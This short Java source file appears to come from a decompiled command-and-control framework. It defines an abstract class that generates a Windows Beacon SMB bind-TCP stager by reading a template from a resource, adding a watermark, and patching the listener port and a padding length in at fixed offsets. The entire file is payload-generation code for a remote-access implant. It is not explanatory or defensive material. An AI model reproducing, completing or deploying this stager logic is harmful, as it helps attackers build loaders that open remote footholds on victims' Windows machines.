package stagers;

import common.CommonUtils;
import common.Listener;
import common.Packer;

public abstract class GenericBindStager
        extends GenericStager {
    public GenericBindStager(Listener l) {
        super(l);
    }

    @Override
    public String payload() {
        return "windows/beacon_smb/bind_tcp";
    }

    public abstract String getFile();

    public abstract int getPortOffset();

    public abstract int getDataOffset();

    @Override
    public byte[] generate() {
        String data = CommonUtils.bString(CommonUtils.readResource(this.getFile())) + this.getConfig().getWatermark();
        Packer packer = new Packer();
        packer.addShort(this.getListener().getPort());
        data = CommonUtils.replaceAt(data, CommonUtils.bString(packer.getBytes()), this.getPortOffset());
        packer = new Packer();
        packer.little();
        packer.addInt(this.getConfig().getBindGarbageLength());
        data = CommonUtils.replaceAt(data, CommonUtils.bString(packer.getBytes()), this.getDataOffset());
        return CommonUtils.toBytes(data);
    }
}

